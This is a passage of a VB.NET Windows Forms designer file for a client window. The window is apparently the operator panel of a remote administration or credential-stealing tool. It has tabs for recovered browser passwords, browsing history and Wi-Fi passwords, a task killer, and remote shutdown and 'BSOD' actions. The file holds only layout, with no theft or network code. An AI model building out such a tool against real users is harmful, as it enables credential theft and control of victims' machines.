<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Client_Form
    Inherits Custom_Form

    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requise par le Concepteur Windows Form
    Private components As System.ComponentModel.IContainer

    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
    'Ne la modifiez pas à l'aide de l'éditeur de code.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim ListViewItem1 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Log Out", 8)
        Dim ListViewItem2 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Reboot", 10)
        Dim ListViewItem3 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Shutdown", 9)
        Dim ListViewItem4 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Suspend", "icons8_stop_32.png")
        Dim ListViewItem5 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Hibernate")
        Dim ListViewItem6 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("BSOD", 7)
        Dim ListViewItem7 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Mute Sound", "icons8_mute_32.png")
        Dim ListViewItem8 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("Volume Up", "icons8_plus_32.png")
        Dim ListViewItem9 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"Volume Down"}, "icons8_minus_32.png", System.Drawing.Color.Empty, System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer)), Nothing)
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Client_Form))
        Me.Pass_MenuStrip = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RecoverPasswordsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Save_PassMenu = New System.Windows.Forms.ToolStripMenuItem()
        Me.Hist_MenuStrip = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.Recover_history = New System.Windows.Forms.ToolStripMenuItem()
        Me.Save_HistoryMenu = New System.Windows.Forms.ToolStripMenuItem()
        Me.W_PW_MenuStrip = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RecoverWifiPasswordToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SaveToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Tasks_MGR_MenuStrip = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KillTaskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PauseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ResumseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.Custom_Button1 = New Server.Custom_Button()
        Me.TabControlExt1 = New Server.HZH_Controls.Controls.TabControlExt()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.Loading_PW = New MRG.Controls.UI.LoadingCircle()
        Me.Passwords_ListView = New Server.AeroListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.Loading_Hist = New MRG.Controls.UI.LoadingCircle()
        Me.Hist_ListView = New Server.AeroListView()
        Me.ColumnHeader5 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader6 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader7 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader8 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.Loading_W_PW = New MRG.Controls.UI.LoadingCircle()
        Me.W_PW_ListView = New Server.AeroListView()
        Me.ColumnHeader9 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader10 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.CMD_ListView = New Server.AeroListView()
        Me.ColumnHeader12 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Command_MenuStrip = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.LaunchToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.Loading_tasks = New MRG.Controls.UI.LoadingCircle()
        Me.Helper_Task_Label = New System.Windows.Forms.Label()
        Me.Tasks_listview = New System.Windows.Forms.ListView()
        Me.ColumnHeader11 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Pass_MenuStrip.SuspendLayout()
        Me.Hist_MenuStrip.SuspendLayout()
        Me.W_PW_MenuStrip.SuspendLayout()
        Me.Tasks_MGR_MenuStrip.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabControlExt1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        Me.Command_MenuStrip.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        Me.SuspendLayout()
        '
        'Pass_MenuStrip
        '
        Me.Pass_MenuStrip.ImageScalingSize = New System.Drawing.Size(28, 28)
        Me.Pass_MenuStrip.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RecoverPasswordsToolStripMenuItem, Me.Save_PassMenu})
        Me.Pass_MenuStrip.Name = "Pass_MenuStrip"
        Me.Pass_MenuStrip.Size = New System.Drawing.Size(187, 72)
        '
        'RecoverPasswordsToolStripMenuItem
        '
        Me.RecoverPasswordsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.RecoverPasswordsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.RecoverPasswordsToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_key_32
        Me.RecoverPasswordsToolStripMenuItem.Name = "RecoverPasswordsToolStripMenuItem"
        Me.RecoverPasswordsToolStripMenuItem.Size = New System.Drawing.Size(186, 34)
        Me.RecoverPasswordsToolStripMenuItem.Text = "Recover Passwords"
        '
        'Save_PassMenu
        '
        Me.Save_PassMenu.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.Save_PassMenu.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Save_PassMenu.Image = Global.Server.My.Resources.Resources.icons8_save_as_32
        Me.Save_PassMenu.Name = "Save_PassMenu"
        Me.Save_PassMenu.Size = New System.Drawing.Size(186, 34)
        Me.Save_PassMenu.Text = "Save"
        '
        'Hist_MenuStrip
        '
        Me.Hist_MenuStrip.ImageScalingSize = New System.Drawing.Size(28, 28)
        Me.Hist_MenuStrip.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.Recover_history, Me.Save_HistoryMenu})
        Me.Hist_MenuStrip.Name = "Pass_MenuStrip"
        Me.Hist_MenuStrip.Size = New System.Drawing.Size(170, 72)
        '
        'Recover_history
        '
        Me.Recover_history.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.Recover_history.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Recover_history.Image = Global.Server.My.Resources.Resources.icons8_time_machine_961
        Me.Recover_history.Name = "Recover_history"
        Me.Recover_history.Size = New System.Drawing.Size(169, 34)
        Me.Recover_history.Text = "Recover History"
        '
        'Save_HistoryMenu
        '
        Me.Save_HistoryMenu.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.Save_HistoryMenu.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Save_HistoryMenu.Image = Global.Server.My.Resources.Resources.icons8_save_as_32
        Me.Save_HistoryMenu.Name = "Save_HistoryMenu"
        Me.Save_HistoryMenu.Size = New System.Drawing.Size(169, 34)
        Me.Save_HistoryMenu.Text = "Save"
        '
        'W_PW_MenuStrip
        '
        Me.W_PW_MenuStrip.ImageScalingSize = New System.Drawing.Size(28, 28)
        Me.W_PW_MenuStrip.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RecoverWifiPasswordToolStripMenuItem, Me.SaveToolStripMenuItem})
        Me.W_PW_MenuStrip.Name = "W_PW_MenuStrip"
        Me.W_PW_MenuStrip.Size = New System.Drawing.Size(206, 72)
        '
        'RecoverWifiPasswordToolStripMenuItem
        '
        Me.RecoverWifiPasswordToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.RecoverWifiPasswordToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.RecoverWifiPasswordToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_key_32
        Me.RecoverWifiPasswordToolStripMenuItem.Name = "RecoverWifiPasswordToolStripMenuItem"
        Me.RecoverWifiPasswordToolStripMenuItem.Size = New System.Drawing.Size(205, 34)
        Me.RecoverWifiPasswordToolStripMenuItem.Text = "Recover Wifi Password"
        '
        'SaveToolStripMenuItem
        '
        Me.SaveToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.SaveToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.SaveToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_save_as_32
        Me.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem"
        Me.SaveToolStripMenuItem.Size = New System.Drawing.Size(205, 34)
        Me.SaveToolStripMenuItem.Text = "Save"
        '
        'Tasks_MGR_MenuStrip
        '
        Me.Tasks_MGR_MenuStrip.BackColor = System.Drawing.SystemColors.ButtonShadow
        Me.Tasks_MGR_MenuStrip.ImageScalingSize = New System.Drawing.Size(28, 28)
        Me.Tasks_MGR_MenuStrip.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem, Me.KillTaskToolStripMenuItem, Me.PauseToolStripMenuItem, Me.ResumseToolStripMenuItem})
        Me.Tasks_MGR_MenuStrip.Name = "Tasks_MGR_MenuStrip"
        Me.Tasks_MGR_MenuStrip.Size = New System.Drawing.Size(129, 140)
        '
        'RefreshToolStripMenuItem
        '
        Me.RefreshToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.RefreshToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.RefreshToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_sync_32
        Me.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem"
        Me.RefreshToolStripMenuItem.Size = New System.Drawing.Size(128, 34)
        Me.RefreshToolStripMenuItem.Text = "Refresh"
        '
        'KillTaskToolStripMenuItem
        '
        Me.KillTaskToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.KillTaskToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.KillTaskToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_cancel_32
        Me.KillTaskToolStripMenuItem.Name = "KillTaskToolStripMenuItem"
        Me.KillTaskToolStripMenuItem.Size = New System.Drawing.Size(128, 34)
        Me.KillTaskToolStripMenuItem.Text = "Kill Task"
        '
        'PauseToolStripMenuItem
        '
        Me.PauseToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.PauseToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.PauseToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_pause_32
        Me.PauseToolStripMenuItem.Name = "PauseToolStripMenuItem"
        Me.PauseToolStripMenuItem.Size = New System.Drawing.Size(128, 34)
        Me.PauseToolStripMenuItem.Text = "Pause"
        '
        'ResumseToolStripMenuItem
        '
        Me.ResumseToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.ResumseToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.ResumseToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_resume_buttond_32
        Me.ResumseToolStripMenuItem.Name = "ResumseToolStripMenuItem"
        Me.ResumseToolStripMenuItem.Size = New System.Drawing.Size(128, 34)
        Me.ResumseToolStripMenuItem.Text = "Resume"
        '
        'Label1
        '
        Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Label1.Location = New System.Drawing.Point(38, 6)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(130, 23)
        Me.Label1.TabIndex = 2
        Me.Label1.Text = "255.255.255.255:65535"
        Me.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'PictureBox1
        '
        Me.PictureBox1.Location = New System.Drawing.Point(7, 3)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(30, 30)
        Me.PictureBox1.TabIndex = 3
        Me.PictureBox1.TabStop = False
        '
        'Custom_Button1
        '
        Me.Custom_Button1.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Custom_Button1.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(120, Byte), Integer), CType(CType(215, Byte), Integer))
        Me.Custom_Button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(10, Byte), Integer), CType(CType(130, Byte), Integer), CType(CType(225, Byte), Integer))
        Me.Custom_Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Custom_Button1.ForeColor = System.Drawing.Color.White
        Me.Custom_Button1.Location = New System.Drawing.Point(915, 0)
        Me.Custom_Button1.Name = "Custom_Button1"
        Me.Custom_Button1.Size = New System.Drawing.Size(28, 28)
        Me.Custom_Button1.TabIndex = 1
        Me.Custom_Button1.Text = "X"
        Me.Custom_Button1.UseVisualStyleBackColor = True
        '
        'TabControlExt1
        '
        Me.TabControlExt1.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.TabControlExt1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.TabControlExt1.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.TabControlExt1.BorderColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.TabControlExt1.CloseBtnColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(85, Byte), Integer), CType(CType(51, Byte), Integer))
        Me.TabControlExt1.Controls.Add(Me.TabPage1)
        Me.TabControlExt1.Controls.Add(Me.TabPage2)
        Me.TabControlExt1.Controls.Add(Me.TabPage3)
        Me.TabControlExt1.Controls.Add(Me.TabPage5)
        Me.TabControlExt1.Controls.Add(Me.TabPage4)
        Me.TabControlExt1.ForeColorBase = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(120, Byte), Integer), CType(CType(215, Byte), Integer))
        Me.TabControlExt1.HeaderBackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.TabControlExt1.HeadSelectedBackColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.TabControlExt1.HeadSelectedBorderColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.TabControlExt1.IsShowCloseBtn = False
        Me.TabControlExt1.ItemSize = New System.Drawing.Size(0, 80)
        Me.TabControlExt1.Location = New System.Drawing.Point(7, 37)
        Me.TabControlExt1.Multiline = True
        Me.TabControlExt1.Name = "TabControlExt1"
        Me.TabControlExt1.SelectedIndex = 0
        Me.TabControlExt1.Size = New System.Drawing.Size(931, 493)
        Me.TabControlExt1.TabIndex = 0
        Me.TabControlExt1.UncloseTabIndexs = Nothing
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.Loading_PW)
        Me.TabPage1.Controls.Add(Me.Passwords_ListView)
        Me.TabPage1.Location = New System.Drawing.Point(84, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3, 28, 3, 3)
        Me.TabPage1.Size = New System.Drawing.Size(843, 485)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Passwords"
        '
        'Loading_PW
        '
        Me.Loading_PW.Active = False
        Me.Loading_PW.Color = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(120, Byte), Integer), CType(CType(215, Byte), Integer))
        Me.Loading_PW.InnerCircleRadius = 5
        Me.Loading_PW.Location = New System.Drawing.Point(6, 3)
        Me.Loading_PW.Name = "Loading_PW"
        Me.Loading_PW.NumberSpoke = 12
        Me.Loading_PW.OuterCircleRadius = 11
        Me.Loading_PW.RotationSpeed = 100
        Me.Loading_PW.Size = New System.Drawing.Size(28, 25)
        Me.Loading_PW.SpokeThickness = 2
        Me.Loading_PW.StylePreset = MRG.Controls.UI.LoadingCircle.StylePresets.MacOSX
        Me.Loading_PW.TabIndex = 6
        Me.Loading_PW.Text = "LoadingCircle2"
        Me.Loading_PW.Visible = False
        '
        'Passwords_ListView
        '
        Me.Passwords_ListView.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.Passwords_ListView.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.Passwords_ListView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4})
        Me.Passwords_ListView.ContextMenuStrip = Me.Pass_MenuStrip
        Me.Passwords_ListView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Passwords_ListView.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Passwords_ListView.HideSelection = False
        Me.Passwords_ListView.Location = New System.Drawing.Point(3, 28)
        Me.Passwords_ListView.Name = "Passwords_ListView"
        Me.Passwords_ListView.Size = New System.Drawing.Size(837, 454)
        Me.Passwords_ListView.TabIndex = 0
        Me.Passwords_ListView.UseCompatibleStateImageBehavior = False
        Me.Passwords_ListView.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "URL"
        Me.ColumnHeader1.Width = 247
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "Username"
        Me.ColumnHeader2.Width = 103
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Password"
        Me.ColumnHeader3.Width = 212
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "Application"
        Me.ColumnHeader4.Width = 254
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.Loading_Hist)
        Me.TabPage2.Controls.Add(Me.Hist_ListView)
        Me.TabPage2.Location = New System.Drawing.Point(84, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3, 28, 3, 3)
        Me.TabPage2.Size = New System.Drawing.Size(843, 485)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "History"
        '
        'Loading_Hist
        '
        Me.Loading_Hist.Active = False
        Me.Loading_Hist.Color = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(120, Byte), Integer), CType(CType(215, Byte), Integer))
        Me.Loading_Hist.InnerCircleRadius = 5
        Me.Loading_Hist.Location = New System.Drawing.Point(6, 3)
        Me.Loading_Hist.Name = "Loading_Hist"
        Me.Loading_Hist.NumberSpoke = 12
        Me.Loading_Hist.OuterCircleRadius = 11
        Me.Loading_Hist.RotationSpeed = 100
        Me.Loading_Hist.Size = New System.Drawing.Size(28, 25)
        Me.Loading_Hist.SpokeThickness = 2
        Me.Loading_Hist.StylePreset = MRG.Controls.UI.LoadingCircle.StylePresets.MacOSX
        Me.Loading_Hist.TabIndex = 7
        Me.Loading_Hist.Text = "LoadingCircle2"
        Me.Loading_Hist.Visible = False
        '
        'Hist_ListView
        '
        Me.Hist_ListView.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.Hist_ListView.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.Hist_ListView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader5, Me.ColumnHeader6, Me.ColumnHeader7, Me.ColumnHeader8})
        Me.Hist_ListView.ContextMenuStrip = Me.Hist_MenuStrip
        Me.Hist_ListView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Hist_ListView.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Hist_ListView.HideSelection = False
        Me.Hist_ListView.Location = New System.Drawing.Point(3, 28)
        Me.Hist_ListView.Name = "Hist_ListView"
        Me.Hist_ListView.Size = New System.Drawing.Size(837, 454)
        Me.Hist_ListView.TabIndex = 1
        Me.Hist_ListView.UseCompatibleStateImageBehavior = False
        Me.Hist_ListView.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "Application"
        Me.ColumnHeader5.Width = 142
        '
        'ColumnHeader6
        '
        Me.ColumnHeader6.Text = "Title"
        Me.ColumnHeader6.Width = 215
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.Text = "URL"
        Me.ColumnHeader7.Width = 289
        '
        'ColumnHeader8
        '
        Me.ColumnHeader8.Text = "Last Visit"
        Me.ColumnHeader8.Width = 201
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.TabPage3.Controls.Add(Me.Loading_W_PW)
        Me.TabPage3.Controls.Add(Me.W_PW_ListView)
        Me.TabPage3.Location = New System.Drawing.Point(84, 4)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Padding = New System.Windows.Forms.Padding(3, 28, 3, 3)
        Me.TabPage3.Size = New System.Drawing.Size(843, 485)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Networking"
        '
        'Loading_W_PW
        '
        Me.Loading_W_PW.Active = False
        Me.Loading_W_PW.Color = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(120, Byte), Integer), CType(CType(215, Byte), Integer))
        Me.Loading_W_PW.InnerCircleRadius = 5
        Me.Loading_W_PW.Location = New System.Drawing.Point(6, 3)
        Me.Loading_W_PW.Name = "Loading_W_PW"
        Me.Loading_W_PW.NumberSpoke = 12
        Me.Loading_W_PW.OuterCircleRadius = 11
        Me.Loading_W_PW.RotationSpeed = 100
        Me.Loading_W_PW.Size = New System.Drawing.Size(28, 25)
        Me.Loading_W_PW.SpokeThickness = 2
        Me.Loading_W_PW.StylePreset = MRG.Controls.UI.LoadingCircle.StylePresets.MacOSX
        Me.Loading_W_PW.TabIndex = 8
        Me.Loading_W_PW.Text = "LoadingCircle2"
        Me.Loading_W_PW.Visible = False
        '
        'W_PW_ListView
        '
        Me.W_PW_ListView.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.W_PW_ListView.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.W_PW_ListView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader9, Me.ColumnHeader10})
        Me.W_PW_ListView.ContextMenuStrip = Me.W_PW_MenuStrip
        Me.W_PW_ListView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.W_PW_ListView.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.W_PW_ListView.HideSelection = False
        Me.W_PW_ListView.Location = New System.Drawing.Point(3, 28)
        Me.W_PW_ListView.Name = "W_PW_ListView"
        Me.W_PW_ListView.Size = New System.Drawing.Size(837, 454)
        Me.W_PW_ListView.TabIndex = 0
        Me.W_PW_ListView.UseCompatibleStateImageBehavior = False
        Me.W_PW_ListView.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader9
        '
        Me.ColumnHeader9.Text = "SSID"
        Me.ColumnHeader9.Width = 197
        '
        'ColumnHeader10
        '
        Me.ColumnHeader10.Text = "Password"
        Me.ColumnHeader10.Width = 174
        '
        'TabPage5
        '
        Me.TabPage5.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.TabPage5.Controls.Add(Me.CMD_ListView)
        Me.TabPage5.Location = New System.Drawing.Point(84, 4)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage5.Size = New System.Drawing.Size(843, 485)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "Miscellaneous"
        '
        'CMD_ListView
        '
        Me.CMD_ListView.Alignment = System.Windows.Forms.ListViewAlignment.[Default]
        Me.CMD_ListView.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.CMD_ListView.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.CMD_ListView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader12})
        Me.CMD_ListView.ContextMenuStrip = Me.Command_MenuStrip
        Me.CMD_ListView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.CMD_ListView.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.CMD_ListView.FullRowSelect = True
